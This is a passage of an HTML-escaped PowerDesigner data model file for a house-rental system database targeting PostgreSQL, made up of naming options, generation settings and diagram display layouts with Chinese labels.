Objects\\ClssNamingOptions\\FRMEOBJ\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\FRMELNK][ModelOptions\\Physical Objects\\ClssNamingOptions\\FRMELNK\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\FRMELNK\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\DefaultClass][ModelOptions\\Physical Objects\\ClssNamingOptions\\DefaultClass\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Physical Objects\\ClssNamingOptions\\DefaultClass\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Connection][ModelOptions\\Pdm][ModelOptions\\Generate][ModelOptions\\Generate\\Xsm]GenRootElement=YesGenComplexType=NoGenAttribute=YesCheckModel=YesSaveLinks=YesORMapping=NoNameToCode=No[ModelOptions\\Generate\\Pdm]RRMapping=No[ModelOptions\\Generate\\Cdm]CheckModel=YesSaveLinks=YesNameToCode=NoNotation=2[ModelOptions\\Generate\\Oom]CheckModel=YesSaveLinks=YesORMapping=NoNameToCode=YesClassPrefix=[ModelOptions\\Generate\\Ldm]CheckModel=YesSaveLinks=YesNameToCode=No[ModelOptions\\Default Opts][ModelOptions\\Default Opts\\TABL]PhysOpts=[ModelOptions\\Default Opts\\COLN]PhysOpts=[ModelOptions\\Default Opts\\INDX]PhysOpts=[ModelOptions\\Default Opts\\AKEY]PhysOpts=[ModelOptions\\Default Opts\\PKEY]PhysOpts=[ModelOptions\\Default Opts\\STOR]PhysOpts=[ModelOptions\\Default Opts\\TSPC]PhysOpts=[ModelOptions\\Default Opts\\SQNC]PhysOpts=[ModelOptions\\Default Opts\\DTBS]PhysOpts=[ModelOptions\\Default Opts\\USER]PhysOpts=[ModelOptions\\Default Opts\\JIDX]PhysOpts=&lt;/a:ModelOptionsText&gt;&lt;a:RepositoryFilename&gt;%_EXAMPLES%\\我的项目\\房屋租赁系统.pdm&lt;/a:RepositoryFilename&gt;&lt;c:GenerationOrigins&gt;&lt;o:Shortcut Id=&quot;o3&quot;&gt;&lt;a:ObjectID&gt;702A7F1E-B286-4C8D-B8B5-1071151B791D&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租赁系统&lt;/a:Name&gt;&lt;a:Code&gt;房屋租赁系统&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:TargetStereotype/&gt;&lt;a:TargetID&gt;E0CA7255-710D-4C0F-8906-045A9AB7CB75&lt;/a:TargetID&gt;&lt;a:TargetClassID&gt;5F45F978-C4F3-4E35-A3FC-AF3318663A0F&lt;/a:TargetClassID&gt;&lt;/o:Shortcut&gt;&lt;/c:GenerationOrigins&gt;&lt;c:DBMS&gt;&lt;o:Shortcut Id=&quot;o4&quot;&gt;&lt;a:ObjectID&gt;A6D53538-FF07-45F8-A02E-49C5D4A2B179&lt;/a:ObjectID&gt;&lt;a:Name&gt;PostgreSQL 9.x&lt;/a:Name&gt;&lt;a:Code&gt;PGSQL9&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618332891&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332891&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:TargetStereotype/&gt;&lt;a:TargetID&gt;83063C86-4E0A-4954-BF00-620C0D0F02D8&lt;/a:TargetID&gt;&lt;a:TargetClassID&gt;4BA9F647-DAB1-11D1-9944-006097355D9B&lt;/a:TargetClassID&gt;&lt;/o:Shortcut&gt;&lt;/c:DBMS&gt;&lt;c:PhysicalDiagrams&gt;&lt;o:PhysicalDiagram Id=&quot;o5&quot;&gt;&lt;a:ObjectID&gt;5C8232D1-AC9A-4E87-A315-4AD2F65BAA28&lt;/a:ObjectID&gt;&lt;a:Name&gt;表一&lt;/a:Name&gt;&lt;a:Code&gt;表一&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;90E3187A-DBAA-4EE6-AC18-300D97652717&#125;DAT 1618333034ORG &#123;0A29E6FF-59EC-4690-AAFB-D878AB26683D&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DisplayPreferences&gt;[DisplayPreferences][DisplayPreferences\\PDM][DisplayPreferences\\General]Adjust to text=YesSnap Grid=NoConstrain Labels=YesDisplay Grid=NoShow Page Delimiter=NoShow Links intersections=YesActivate automatic link routing=YesGrid size=800Graphic unit=2Window color=255 255 255Background image=Background mode=8Watermark image=Watermark mode=8Show watermark on screen=NoGradient mode=0Gradient end color=255 255 255Show Swimlane=NoSwimlaneVert=YesTreeVert=NoCompDark=0[DisplayPreferences\\Object]Show Icon=NoMode=0Trunc Length=80Word Length=80Word Text=!&amp;quot;&amp;quot;#$%&amp;amp;&amp;#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\\]^_`&#123;|&#125;~Shortcut IntIcon=YesShortcut IntLoct=YesShortcut IntFullPath=NoShortcut IntLastPackage=YesShortcut ExtIcon=YesShortcut ExtLoct=NoShortcut ExtFullPath=NoShortcut ExtLastPackage=YesShortcut ExtIncludeModl=YesEObjShowStrn=YesExtendedObject.Comment=NoExtendedObject.IconPicture=NoExtendedObject.TextStyle=NoExtendedObject_SymbolLayout=ELnkShowStrn=YesELnkShowName=YesExtendedLink_SymbolLayout=ExtDpdShowStrn=YesExtendedDependency_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Stereotype&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;FileObject.Stereotype=NoFileObject.DisplayName=YesFileObject.LocationOrName=NoFileObject.IconPicture=NoFileObject.TextStyle=NoFileObject.IconMode=YesFileObject_SymbolLayout=Package.Stereotype=YesPackage.Comment=NoPackage.IconPicture=NoPackage.TextStyle=NoPackage_SymbolLayout=Display Model Version=YesTable.Stereotype=YesTable.DisplayName=YesTable.OwnerDisplayName=NoTable.Columns=YesTable.Columns._Filter=所有列 PDMCOLNALLTable.Columns._Columns=Stereotype IdentifierIndicator DomainOrDataType NullIndicatorTable.Columns._Limit=-5Table.Keys=NoTable.Keys._Columns=Stereotype IndicatorTable.Indexes=NoTable.Indexes._Columns=StereotypeTable.Triggers=NoTable.Triggers._Columns=StereotypeTable.Comment=NoTable.IconPicture=NoTable.TextStyle=NoTable_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;ExclusiveChoice Name=&amp;quot;Exclusive Choice&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; Display=&amp;quot;HorizontalRadios&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Owner and Name&amp;quot; Attribute=&amp;quot;OwnerDisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/ExclusiveChoice&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Columns&amp;quot; Collection=&amp;quot;Columns&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nDataType No\\r\\nSymbolDataType No 域或数据类型\\r\\nDomain No\\r\\nKeyIndicator No\\r\\nIndexIndicator No\\r\\nNullStatus No&amp;quot; Filters=&amp;quot;所有列 PDMCOLNALL &amp;amp;quot;&amp;amp;quot;\\r\\n主键列 PDMCOLNPK &amp;amp;quot;\\&amp;amp;quot;PRIM \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;\\r\\n键列 PDMCOLNKEY &amp;amp;quot;\\&amp;amp;quot;KEYS \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;&amp;quot; HasLimit=&amp;quot;Yes&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Keys&amp;quot; Collection=&amp;quot;Keys&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIndicator No&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Indexes&amp;quot; Collection=&amp;quot;Indexes&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIndicator No&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Triggers&amp;quot; Collection=&amp;quot;Triggers&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;View.Stereotype=YesView.DisplayName=YesView.OwnerDisplayName=NoView.Columns=YesView.Columns._Columns=DisplayNameView.Columns._Limit=-5View.TemporaryVTables=YesView.Indexes=NoView.Comment=NoView.IconPicture=NoView.TextStyle=NoView_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;ExclusiveChoice Name=&amp;quot;Exclusive Choice&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; Display=&amp;quot;HorizontalRadios&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Owner and Name&amp;quot; Attribute=&amp;quot;OwnerDisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/ExclusiveChoice&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Columns&amp;quot; Collection=&amp;quot;Columns&amp;quot; Columns=&amp;quot;DisplayName No\\r\\nExpression No\\r\\nDataType No\\r\\nSymbolDataType No 域或数据类型\\r\\nIndexIndicator No&amp;quot; HasLimit=&amp;quot;Yes&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Tables&amp;quot; Collection=&amp;quot;TemporaryVTables&amp;quot; Columns=&amp;quot;Name Yes&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Indexes&amp;quot; Collection=&amp;quot;Indexes&amp;quot; Columns=&amp;quot;DisplayName Yes&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Procedure.Stereotype=NoProcedure.DisplayName=YesProcedure.OwnerDisplayName=NoProcedure.Comment=NoProcedure.IconPicture=NoProcedure.TextStyle=NoProcedure_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;ExclusiveChoice Name=&amp;quot;Exclusive Choice&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; Display=&amp;quot;HorizontalRadios&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Owner and Name&amp;quot; Attribute=&amp;quot;OwnerDisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/ExclusiveChoice&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Reference.Cardinality=NoReference.ImplementationType=NoReference.ChildRole=YesReference.Stereotype=YesReference.DisplayName=YesReference.ForeignKeyConstraintName=YesReference.JoinExpression=NoReference.Integrity=NoReference.ParentRole=YesReference_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;Cardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Implementation&amp;quot; Attribute=&amp;quot;ImplementationType&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Child Role&amp;quot; Attribute=&amp;quot;ChildRole&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;ExclusiveChoice Name=&amp;quot;Exclusive Choice&amp;quot; Mandatory=&amp;quot;No&amp;quot; Display=&amp;quot;HorizontalRadios&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;约束名称(&amp;amp;amp;T)&amp;quot; Attribute=&amp;quot;ForeignKeyConstraintName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;约束名称(&amp;amp;amp;T)&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;连接&amp;quot; Attribute=&amp;quot;JoinExpression&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;连接&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/ExclusiveChoice&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;参照完整性&amp;quot; Attribute=&amp;quot;Integrity&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;参照完整性&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Parent Role&amp;quot; Attribute=&amp;quot;ParentRole&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;ViewReference.ChildRole=YesViewReference.Stereotype=YesViewReference.DisplayName=NoViewReference.JoinExpression=NoViewReference.ParentRole=YesViewReference_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Child Role&amp;quot; Attribute=&amp;quot;ChildRole&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;ExclusiveChoice Name=&amp;quot;Exclusive Choice&amp;quot; Mandatory=&amp;quot;No&amp;quot; Display=&amp;quot;HorizontalRadios&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Join Expression&amp;quot; Attribute=&amp;quot;JoinExpression&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/ExclusiveChoice&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Parent Role&amp;quot; Attribute=&amp;quot;ParentRole&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Entity.Stereotype=YesEntity.Attributes=YesEntity.Attributes._Filter=所有属性 CDMPENTALLEntity.Attributes._Columns=Stereotype DomainOrDataType IdentifierIndicator NullIndicatorEntity.Attributes._Limit=-5Entity.Identifiers=YesEntity.Identifiers._Columns=Stereotype IdentifierIndicatorEntity.Comment=NoEntity.IconPicture=NoEntity.TextStyle=NoEntity_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Attributes&amp;quot; Collection=&amp;quot;Attributes&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIdentifierIndicator No 标识符指标\\r\\nDataType No\\r\\nDomainOrDataType No 域或数据类型\\r\\nDomain No\\r\\nNullIndicator No 强制性&amp;quot; Filters=&amp;quot;所有属性 CDMPENTALL &amp;amp;quot;&amp;amp;quot;\\r\\n主属性 CDMPENTPK &amp;amp;quot;\\&amp;amp;quot;PIDTF \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;\\r\\n识别属性 CDMPENTIDTF &amp;amp;quot;\\&amp;amp;quot;AIDF \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;&amp;quot; HasLimit=&amp;quot;Yes&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Identifiers&amp;quot; Collection=&amp;quot;Identifiers&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIdentifierIndicator No 标识符指标&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; 